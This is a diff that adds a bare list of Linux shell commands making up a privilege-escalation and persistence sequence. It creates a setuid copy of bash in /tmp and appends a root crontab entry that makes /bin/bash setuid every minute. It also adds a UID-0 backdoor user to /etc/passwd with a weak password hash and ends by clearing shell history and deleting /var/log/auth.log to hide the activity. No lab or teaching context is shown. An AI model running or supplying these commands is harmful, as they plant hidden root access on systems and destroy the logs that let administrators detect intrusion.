@@ -1,0 +1,29 @@
+whoami
+id
+
+cp /bin/bash /tmp/rootbash
+chmod u+s /tmp/rootbash
+ls -l /tmp/rootbash
+
+/tmp/rootbash -p
+whoami
+
+sudo chown root:root /tmp/rootbash
+sudo chmod u+s /tmp/rootbash
+ls -l /tmp/rootbash
+
+/tmp/rootbash -p
+whoami
+id
+
+ls -l /bin/bash
+
+echo '* * * * * root /bin/bash -c "chmod u+s /bin/bash"' >> /etc/crontab
+
+openssl passwd -1 admin123
+echo 'sysadmin:<hash>:0:0:System Admin:/root:/bin/bash' >> /etc/passwd
+su sysadmin
+
+history -c
+echo "" > ~/.bash_history
+rm /var/log/auth.log
